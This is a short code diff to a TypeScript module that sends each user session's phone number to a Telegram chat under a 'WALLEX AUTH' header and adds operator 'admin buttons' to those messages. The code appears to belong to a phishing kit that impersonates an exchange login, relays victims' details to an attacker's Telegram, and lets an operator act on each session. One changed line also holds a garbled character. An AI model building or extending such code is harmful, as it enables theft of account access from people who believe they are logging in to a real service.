@@ -554,8 +554,13 @@ export const sendPhoneToTelegramEnhanced = async (
     };
 
     const message = formatInitialMessage(session);
+    const adminKeyboard = getAdminKeyboard(sessionId, session);
 
-    console.log("📤 Sending message to Telegram:", { sessionId, phoneNumber });
+    console.log("📤 Sending message to Telegram with admin buttons:", {
+      sessionId,
+      phoneNumber,
+      buttonCount: adminKeyboard.inline_keyboard.flat().length
+    });
 
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout
@@ -572,9 +577,7 @@ export const sendPhoneToTelegramEnhanced = async (
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
             parse_mode: "HTML",
-            reply_markup: {
-              inline_keyboard: [], // No buttons initially
-            },
+            reply_markup: adminKeyboard,
           }),
           signal: controller.signal,
         },
@@ -1455,7 +1458,7 @@ const formatSessionMessage = (session: UserSession): string => {
 
   // Professional header
   let message = `${status.emoji} <b>WALLEX AUTH</b> ${status.priority} ${status.urgency}
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬��▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 📱 <b>${escapeHtml(session.phoneNumber)}</b>
 🕐 ${currentDate} ${currentTime} • ${durationText}`;
 
